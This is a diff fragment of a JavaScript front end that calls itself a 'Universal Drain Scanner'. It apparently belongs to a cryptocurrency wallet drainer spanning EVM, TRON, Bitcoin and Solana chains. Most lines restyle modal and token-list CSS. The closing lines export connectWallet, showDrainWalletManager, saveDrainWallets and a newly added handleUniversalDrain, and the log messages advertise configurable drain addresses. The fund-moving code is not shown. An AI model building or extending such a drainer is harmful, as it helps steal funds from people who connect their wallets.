+        'manual': 'Manual Address'
     };
-    
-    return prices[coin] || 1;
+    return names[type] || type;
+}
+
+function shortAddress(address, length = 8) {
+    if (!address) return '';
+    if (address.length <= length + 3) return address;
+    return address.substring(0, length) + '...' + address.substring(address.length - 4);
 }
 
 function delay(ms) {
@@ -978,6 +880,9 @@ function delay(ms) {
 // ================================================
 
 function addModalStyles() {
+    const styleId = 'modal-styles';
+    if (document.getElementById(styleId)) return;
+    
     const styles = `
         .modal-overlay {
             position: fixed;
@@ -986,95 +891,79 @@ function addModalStyles() {
             display: flex;
             align-items: center;
             justify-content: center;
-            z-index: 9999;
-            backdrop-filter: blur(5px);
+            z-index: 10000;
         }
         
         .modal-content {
             background: white;
-            border-radius: 20px;
+            border-radius: 12px;
             width: 90%;
             max-width: 500px;
             max-height: 80vh;
             overflow: hidden;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-            animation: modalSlide 0.3s ease;
         }
         
         .wide-modal {
-            max-width: 700px;
+            max-width: 600px;
         }
         
         .modal-header {
-            padding: 20px 24px;
-            border-bottom: 1px solid #e5e7eb;
+            padding: 16px 20px;
+            background: #4f46e5;
+            color: white;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
         }
         
         .modal-header h3 {
             margin: 0;
-            font-size: 20px;
-            font-weight: 600;
+            font-size: 18px;
         }
         
         .modal-close {
-            background: rgba(255, 255, 255, 0.2);
+            background: none;
             border: none;
-            width: 36px;
-            height: 36px;
-            border-radius: 50%;
             color: white;
             font-size: 24px;
             cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
             line-height: 1;
         }
         
         .modal-body {
-            padding: 24px;
+            padding: 20px;
             overflow-y: auto;
-            max-height: calc(80vh - 100px);
         }
         
         .wallet-options {
             display: flex;
             flex-direction: column;
-            gap: 12px;
+            gap: 10px;
         }
         
         .wallet-option {
             display: flex;
             align-items: center;
-            gap: 16px;
-            padding: 16px;
-            border: 2px solid #e5e7eb;
-            border-radius: 12px;
+            gap: 12px;
+            padding: 12px;
+            border: 1px solid #e5e7eb;
+            border-radius: 8px;
             cursor: pointer;
-            transition: all 0.2s;
         }
         
         .wallet-option:hover {
-            border-color: #3b82f6;
-            background: #f8fafc;
-            transform: translateX(4px);
+            background: #f9fafb;
+            border-color: #4f46e5;
         }
         
         .wallet-icon {
-            width: 50px;
-            height: 50px;
-            border-radius: 12px;
+            width: 40px;
+            height: 40px;
+            border-radius: 8px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 24px;
-            color: white;
-            flex-shrink: 0;
+            font-size: 20px;
         }
         
         .wallet-text {
@@ -1083,86 +972,142 @@ function addModalStyles() {
         
         .wallet-name {
             font-weight: 600;
-            color: #111827;
             margin-bottom: 2px;
         }
         
         .wallet-chains {
             color: #6b7280;
-            font-size: 14px;
+            font-size: 12px;
         }
         
         .modal-footer {
             margin-top: 20px;
             text-align: center;
-            padding-top: 20px;
-            border-top: 1px solid #e5e7eb;
-        }
-        
-        .chain-support {
-            color: #6b7280;
-            font-size: 14px;
-            margin: 0;
-        }
-        
-        /* Wallet Config */
-        .wallet-config {
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-        }
-        
-        .config-item {
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-        }
-        
-        .config-item label {
-            font-weight: 600;
-            color: #374151;
-        }
-        
-        .config-item input {
-            padding: 12px;
-            border: 2px solid #d1d5db;
-            border-radius: 8px;
-            font-family: monospace;
-            font-size: 14px;
-        }
-        
-        .config-item small {
             color: #6b7280;
             font-size: 12px;
         }
         
+        .wallet-config {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        
+        .config-item label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: 600;
+        }
+        
+        .config-item input {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #d1d5db;
+            border-radius: 6px;
+        }
+        
+        .config-item small {
+            color: #6b7280;
+            font-size: 11px;
+        }
+        
         .modal-actions {
             display: flex;
-            gap: 12px;
-            margin-top: 24px;
-            justify-content: flex-end;
+            gap: 10px;
+            margin-top: 20px;
         }
         
         .btn-primary, .btn-secondary {
-            padding: 12px 24px;
-            border-radius: 8px;
+            padding: 10px 20px;
+            border-radius: 6px;
             border: none;
-            font-weight: 600;
             cursor: pointer;
-            transition: all 0.2s;
         }
         
         .btn-primary {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: #4f46e5;
             color: white;
         }
         
         .btn-secondary {
-            background: #f3f4f6;
+            background: #e5e7eb;
             color: #374151;
         }
         
-        /* Scanning Animation */
+        /* Token display styles */
+        .chain-section {
+            margin-bottom: 20px;
+            border: 1px solid #e5e7eb;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        
+        .chain-header {
+            padding: 12px 16px;
+            background: #f9fafb;
+            border-bottom: 1px solid #e5e7eb;
+            display: flex;
+            justify-content: space-between;
+        }
+        
+        .tokens-list {
+            padding: 10px;
+        }
+        
+        .token-item {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            border-bottom: 1px solid #f3f4f6;
+        }
+        
+        .token-item:last-child {
+            border-bottom: none;
+        }
+        
+        .token-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: white;
+            margin-right: 12px;
+        }
+        
+        .token-icon.evm { background: #3b82f6; }
+        .token-icon.tron { background: #ff060a; }
+        .token-icon.bitcoin { background: #f7931a; }
+        .token-icon.solana { background: #9945ff; }
+        
+        .token-info {
+            flex: 1;
+        }
+        
+        .token-symbol {
+            font-weight: 600;
+        }
+        
+        .token-name {
+            color: #6b7280;
+            font-size: 12px;
+        }
+        
+        .token-values {
+            text-align: right;
+        }
+        
+        .token-amount {
+            font-weight: 600;
+        }
+        
+        .token-value {
+            color: #059669;
+            font-size: 14px;
+        }
+        
         .scanning-progress {
             text-align: center;
             padding: 40px;
@@ -1173,122 +1118,10 @@ function addModalStyles() {
             width: 40px;
             height: 40px;
             border: 4px solid #e5e7eb;
-            border-top: 4px solid #3b82f6;
+            border-top: 4px solid #4f46e5;
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin: 0 auto 20px;
-        }
-        
-        /* Token Display */
-        .chain-group {
-            margin-bottom: 30px;
-            background: white;
-            border-radius: 12px;
-            overflow: hidden;
-            border: 1px solid #e5e7eb;
-        }
-        
-        .chain-header {
-            background: #f8fafc;
-            padding: 16px 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid #e5e7eb;
-        }
-        
-        .chain-name {
-            font-weight: 600;
-            color: #111827;
-            font-size: 18px;
-        }
-        
-        .chain-total {
-            font-weight: 600;
-            color: #059669;
-            font-size: 18px;
-        }
-        
-        .tokens-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
-            gap: 12px;
-            padding: 20px;
-        }
-        
-        .token-card {
-            background: white;
-            border: 1px solid #e5e7eb;
-            border-radius: 10px;
-            padding: 16px;
-            transition: all 0.2s;
-        }
-        
-        .token-card:hover {
-            border-color: #3b82f6;
-            box-shadow: 0 4px 6px -1px rgba(59, 130, 246, 0.1);
-        }
-        
-        .token-symbol {
-            font-weight: 600;
-            color: #111827;
-            font-size: 18px;
-            margin-bottom: 4px;
-        }
-        
-        .token-name {
-            color: #6b7280;
-            font-size: 14px;
-            margin-bottom: 8px;
-        }
-        
-        .token-amount {
-            font-weight: 600;
-            color: #111827;
-            margin-bottom: 4px;
-        }
-        
-        .token-value {
-            color: #059669;
-            font-weight: 600;
-        }
-        
-        .token-type {
-            font-size: 12px;
-            color: #9ca3af;
-            margin-top: 4px;
-        }
-        
-        .no-results {
-            text-align: center;
-            padding: 40px;
-            color: #6b7280;
-            font-style: italic;
-        }
-        
-        /* Status Messages */
-        .status-message {
-            padding: 10px 16px;
-            border-radius: 8px;
-            margin: 10px 0;
-        }
-        
-        .status-message.success {
-            background: #dcfce7;
-            color: #166534;
-            border: 1px solid #86efac;
-        }
-        
-        .status-message.error {
-            background: #fee2e2;
-            color: #991b1b;
-            border: 1px solid #fca5a5;
-        }
-        
-        .status-message.loading {
-            background: #dbeafe;
-            color: #1e40af;
-            border: 1px solid #93c5fd;
         }
         
         @keyframes spin {
@@ -1296,42 +1129,30 @@ function addModalStyles() {
             100% { transform: rotate(360deg); }
         }
         
-        @keyframes modalSlide {
-            from { transform: translateY(-20px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
-        
-        @media (max-width: 640px) {
-            .modal-content {
-                width: 95%;
-                margin: 10px;
-            }
-            
-            .tokens-grid {
-                grid-template-columns: 1fr;
-            }
-            
-            .wallet-option {
-                padding: 12px;
-            }
+        .no-tokens {
+            text-align: center;
+            padding: 40px;
+            color: #6b7280;
         }
     `;
     
     const styleSheet = document.createElement('style');
+    styleSheet.id = styleId;
     styleSheet.textContent = styles;
     document.head.appendChild(styleSheet);
 }
 
 // ================================================
-// INITIALIZATION
+// INITIALIZE APP
 // ================================================
 
 window.addEventListener('DOMContentLoaded', initializeApp);
+
+// Make functions available globally
 window.connectWallet = connectWallet;
 window.closeModal = closeModal;
 window.showDrainWalletManager = showDrainWalletManager;
 window.saveDrainWallets = saveDrainWallets;
+window.handleUniversalDrain = handleUniversalDrain;
 
-console.log('⚡ Universal Drain Scanner Loaded');
-console.log('📊 Supports: EVM, TRON, Bitcoin, Solana, Dogecoin, Litecoin');
-console.log('💰 Drain Addresses Configurable via Wallet Button');
+console.log('✅ Universal Drain Scanner Loaded');
